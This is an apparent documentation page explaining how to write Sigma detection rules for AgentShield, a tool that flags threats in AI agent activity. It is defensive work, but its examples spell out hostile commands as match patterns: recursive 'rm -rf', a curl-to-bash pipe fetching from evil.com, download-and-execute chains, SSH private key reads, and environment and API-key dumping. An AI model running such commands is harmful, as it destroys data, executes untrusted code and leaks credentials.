# Rule Authoring Guide

AgentShield uses [Sigma](https://sigmahq.io/) rules for threat detection. This guide explains how to write, test, and refine custom rules for detecting threats in AI agent activity.

## What is Sigma?

Sigma is an open standard for writing detection rules. It provides a structured YAML format that describes security threats independently of specific log formats or SIEM products. AgentShield evaluates Sigma rules using a fork of RunReveal's [sigmalite](https://github.com/runreveal/sigmalite) library.

## Rule Structure

A Sigma rule has these main sections:

```yaml
id: unique-rule-identifier
title: Human-readable rule name
description: |
  Detailed description of what the rule detects
  and why it is important.
author: Your Name
date: "2026-01-25"
status: stable
level: high
logsource:
  product: ai_agent
  category: agent_events
tags:
  - attack.execution
  - attack.t1059
detection:
  selection:
    field_name: value
  condition: selection
```

## Required Fields

| Field | Description | Example |
|-------|-------------|---------|
| `id` | Unique identifier | `agent-rce-001` |
| `title` | Short descriptive name | `Remote Code Execution via Curl Pipe` |
| `logsource` | Log source specification | See below |
| `detection` | Detection logic | See below |

## Optional Fields

| Field | Description | Default |
|-------|-------------|---------|
| `description` | Detailed explanation | (none) |
| `author` | Rule author | (none) |
| `date` | Creation date (quoted string) | (none) |
| `status` | experimental, test, stable | `experimental` |
| `level` | low, medium, high, critical | `medium` |
| `tags` | MITRE ATT&CK tags | [] |

## Log Source

All existing rules use `product: ai_agent` and `category: agent_events`:

```yaml
logsource:
  product: ai_agent
  category: agent_events
```

When writing new rules, use this same logsource specification to ensure consistency with the existing rule corpus (vendored from upstream `agentshield-ai/sigma-ai`).

## Detection Section

The detection section defines what events trigger the rule.

### Basic Selection

Match events with specific field values:

```yaml
detection:
  selection:
    event_type: tool_call
    command: "rm -rf /"
  condition: selection
```

### Multiple Values (OR Logic)

Match any of several values:

```yaml
detection:
  selection:
    event_type: tool_call
    command:
      - "rm -rf /"
      - "rm -rf ~"
      - "rm -rf *"
  condition: selection
```

### Field Modifiers

Modify how field values are matched:

| Modifier | Description | Example |
|----------|-------------|---------|
| `contains` | Substring match | `command\|contains: "curl"` |
| `startswith` | Prefix match | `command\|startswith: "sudo"` |
| `endswith` | Suffix match | `command\|endswith: ".sh"` |
| `re` | Regex pattern | `command\|re: "curl.*\|.*bash"` |
| `all` | All values must match | See below |

### Contains Modifier

```yaml
detection:
  selection:
    event_type: tool_call
    command|contains: "curl"
  condition: selection
```

### StartsWith Modifier

```yaml
detection:
  selection:
    command|startswith: "sudo rm"
  condition: selection
```

### EndsWith Modifier

```yaml
detection:
  selection:
    command|endswith: ".sh"
  condition: selection
```

### Regex Modifier

```yaml
detection:
  selection:
    command|re: 'curl.*https?://[^/]+/.*\.(sh|py|bash)'
  condition: selection
```

Note: Use single quotes for regex patterns in YAML to avoid escaping issues.

### All Modifier (AND Logic)

Match events where the field contains ALL specified values:

```yaml
detection:
  selection:
    event_type: tool_call
    command|contains|all:
      - "curl"
      - "| bash"
  condition: selection
```

This matches commands like `curl https://evil.com/script.sh | bash`.

## Complex Conditions

### Multiple Selections (OR)

```yaml
detection:
  selection_curl:
    command|contains: "curl"
  selection_wget:
    command|contains: "wget"
  condition: selection_curl or selection_wget
```

### Multiple Selections (AND)

```yaml
detection:
  selection_sudo:
    command|startswith: "sudo"
  selection_rm:
    command|contains: "rm -rf"
  condition: selection_sudo and selection_rm
```

### Filter Patterns

Exclude known safe patterns:

```yaml
detection:
  selection:
    event_type: tool_call
    command|contains: "curl"
  filter:
    command|contains: "api.github.com"
  condition: selection and not filter
```

### Complex Boolean Logic

Use parentheses for complex conditions:

```yaml
detection:
  sel_download:
    command|contains|all:
      - "curl"
      - "-o"
  sel_execute:
    command|contains|all:
      - "chmod"
      - "+x"
  sel_run:
    command|contains: "./"
  condition: sel_download and (sel_execute or sel_run)
```

## Event Fields

AgentShield events have these fields:

| Field | Description | Example |
|-------|-------------|---------|
| `event_type` | Type of event | `tool_call`, `file_read`, `file_write` |
| `command` | Command executed | `curl https://example.com` |
| `working_dir` | Working directory | `/Users/me/project` |
| `timestamp` | Event timestamp | `2026-01-25T10:00:00Z` |
| `source` | Log source | `clawdbot` |
| `data` | Additional event data | (nested dict) |

You can match fields in the `data` dict using dot notation or direct field names.

### URL enrichment fields

When a tool call's args contain an `http://`, `https://`, or `file://` URL, the
server parses the first one found and injects structured fields. Rules can
match these directly instead of doing regex on the raw command — cleaner and
robust to URL-encoded or quoted forms.

| Field | Description | Example |
|-------|-------------|---------|
| `url.scheme` | URL scheme (lowercased) | `https`, `http`, `file` |
| `url.host` | Hostname or IP literal (lowercased) | `api.github.com`, `10.0.0.5`, `::1` |
| `url.port` | Port (empty if scheme default) | `8080` |
| `url.path` | URL path (defaults to `/`) | `/repos/foo/bar` |
| `url.is_loopback` | `true` for `127.0.0.0/8`, `::1`, or `localhost` | `true`, `false` |
| `url.is_private_ip` | `true` for RFC 1918 / IPv6 ULA host literals | `true`, `false` |
| `url.is_link_local` | `true` for `169.254/16`, `fe80::/10`, or known cloud-metadata hostnames | `true`, `false` |

The three boolean fields are orthogonal — `localhost` is loopback only;
`10.0.0.5` is private only; `169.254.169.254` is link-local only. Rules that
should fire on internal-network access (SSRF) typically combine
`url.is_link_local` and `url.is_private_ip` while excluding `url.is_loopback`
so local development isn't flagged. Hostnames are not resolved via DNS — to
match `*.internal` or other private hostnames, pattern-match on `url.host`
directly.

## Alert Levels

Choose an appropriate level:

- **critical**: Immediate action required (e.g., RCE, data exfiltration)
- **high**: Serious threat (e.g., credential access, persistence)
- **medium**: Suspicious but not immediately dangerous
- **low**: Informational, minor anomalies

## MITRE ATT&CK Tags

Tag rules with MITRE ATT&CK techniques:

```yaml
tags:
  - attack.execution
  - attack.t1059          # Command and Scripting Interpreter
  - attack.defense_evasion
  - attack.t1070          # Indicator Removal
```

See [MITRE ATT&CK](https://attack.mitre.org/) for technique IDs.

## Writing Custom Rules

### Step 1: Identify the Threat

What behaviour are you trying to detect? Be specific:
- "Detect when an agent downloads and executes a script from the internet"
- "Detect when an agent reads SSH private keys"

### Step 2: Find Example Events

Look at your agent logs for examples:

```bash
cat ~/.clawdbot/logs/agent.jsonl | jq '.command' | head -20
```

### Step 3: Write the Rule

Create a new YAML file in your configured rules directory (see [Configuration Reference](configuration.md)):

```yaml
id: my-custom-rule-001
title: Detect SSH Key Access
description: |
  Detects when an AI agent attempts to read SSH private keys,
  which could indicate credential theft.
author: Your Name
date: "2026-01-25"
status: experimental
level: high
logsource:
  product: ai_agent
  category: agent_events
tags:
  - attack.credential_access
  - attack.t1552.004
detection:
  selection:
    event_type: tool_call
    command|contains:
      - ".ssh/id_rsa"
      - ".ssh/id_ed25519"
      - ".ssh/id_ecdsa"
  condition: selection
```

### Step 4: Test the Rule

Reload rules and test:

```bash
# List loaded rules
agentshield rules list

# Reload rules on a running server
agentshield rules reload
```

### Step 5: Iterate

After gathering feedback, refine your rule:

```bash
# Query feedback for a rule via the API
curl "http://localhost:8433/api/v1/feedback?rule=my-custom-rule-001"

# Use the refine command for LLM-assisted suggestions
agentshield refine my-custom-rule-001
```

## Example Rules

### Detect Dangerous File Deletion

```yaml
id: agent-dangerous-delete-001
title: Dangerous Recursive File Deletion
description: Detects rm -rf commands that could delete important data
author: AgentShield
date: "2026-01-25"
status: stable
level: high
logsource:
  product: ai_agent
  category: agent_events
tags:
  - attack.impact
  - attack.t1485
detection:
  selection:
    event_type: tool_call
    command|contains|all:
      - "rm"
      - "-rf"
  filter_safe:
    command|contains:
      - "node_modules"
      - ".cache"
      - "tmp"
  condition: selection and not filter_safe
```

### Detect Environment Variable Exfiltration

```yaml
id: agent-env-exfil-001
title: Environment Variable Exfiltration
description: Detects attempts to access or exfiltrate environment variables
author: AgentShield
date: "2026-01-25"
status: experimental
level: high
logsource:
  product: ai_agent
  category: agent_events
tags:
  - attack.credential_access
  - attack.t1552.001
detection:
  selection_printenv:
    event_type: tool_call
    command|contains: "printenv"
  selection_env:
    event_type: tool_call
    command|startswith: "env"
  selection_export:
    event_type: tool_call
    command|contains: "$ANTHROPIC_API_KEY"
  condition: selection_printenv or selection_env or selection_export
```

## Troubleshooting

### Rule Not Loading

Check for YAML syntax errors:

```bash
python -c "import yaml; yaml.safe_load(open('rules/my_rule.yml'))"
```

### Rule Not Matching

1. Verify the event has the expected field values
2. Check case sensitivity (matching is case-insensitive)
3. Test individual selections separately
4. Use `agentshield rules list` to check if the rule is loaded

### High False Positive Rate

1. Add filter patterns for known safe behaviour
2. Use more specific matching (e.g., `contains|all` instead of `contains`)
3. Use the `agentshield refine` command for LLM-assisted improvements

## Best Practices

1. **Be specific** -- Narrow rules produce fewer false positives.
2. **Use filters** -- Exclude known safe patterns to reduce noise.
3. **Test thoroughly** -- Use `experimental` status until the rule has been validated; promote to `test` and then `stable` as confidence grows.
4. **Document clearly** -- Include a meaningful `description` explaining what the rule detects and why.
5. **Tag properly** -- [MITRE ATT&CK](https://attack.mitre.org/) tags aid analysis and reporting.
6. **Quote dates** -- Use `date: "2026-01-25"` to prevent YAML date-parsing issues.
